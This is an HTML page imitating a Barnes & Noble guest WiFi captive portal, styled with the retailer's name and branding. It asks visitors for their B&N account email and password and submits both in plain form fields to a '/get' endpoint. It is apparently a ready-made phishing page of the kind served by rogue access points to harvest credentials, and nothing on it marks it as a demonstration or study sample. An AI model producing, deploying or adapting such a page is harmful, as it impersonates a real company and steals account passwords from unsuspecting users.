<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Georgia,"Times New Roman",serif;background:#f5f0e8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.bnlogo{text-align:center;margin-bottom:20px}
.bnlogo h1{font-size:26px;font-weight:700;color:#1a3a1a;letter-spacing:0.5px}
.bnlogo p{font-size:11px;color:#888;letter-spacing:1.5px;text-transform:uppercase;margin-top:5px;font-family:sans-serif}
.card{background:#fff;width:100%;max-width:420px;border-radius:12px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.1)}
.ch{background:#1a3a1a;padding:20px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:700;color:#fff;font-family:Georgia,serif;letter-spacing:0.5px}.ch p{font-size:12px;color:rgba(255,255,255,0.65);margin-top:3px;font-family:sans-serif}
.cb{padding:26px 24px 22px;font-family:sans-serif}
.badge{display:flex;align-items:center;gap:10px;background:#f5f0e8;border:1px solid #d8ccc0;border-radius:8px;padding:10px 13px;margin-bottom:20px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
.badge span{font-size:12.5px;color:#888}.badge strong{color:#1a1a1a;font-weight:600}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;background:#faf8f5;color:#1a1a1a}
input:focus{outline:none;border-color:#1a3a1a;box-shadow:0 0 0 3px rgba(26,58,26,0.1)}
input::placeholder{color:#bbb}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#1a3a1a}
.btn{width:100%;padding:13px;border:none;border-radius:8px;background:#1a3a1a;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
.foot{background:#f5f0e8;border-top:1px solid #e0d8cc;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa;font-family:sans-serif}.foot a{color:#1a3a1a;text-decoration:none}
</style>
</head>
<body>
<div class="bnlogo"><h1>Barnes &amp; Noble</h1><p>Booksellers &bull; Free WiFi</p></div>
<div class="card">
  <div class="ch"><h1>Barnes &amp; Noble WiFi</h1><p>Sign in with your B&amp;N account</p></div>
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>BN-Guest</strong></span></div>
    <form action="/get">
      <label class="lbl">B&amp;N Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">Barnes &amp; Noble's Terms of Use</a>.</p>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Barnes &amp; Noble Booksellers</span><a href="#">Help</a></div>
</div>
</body>
</html>
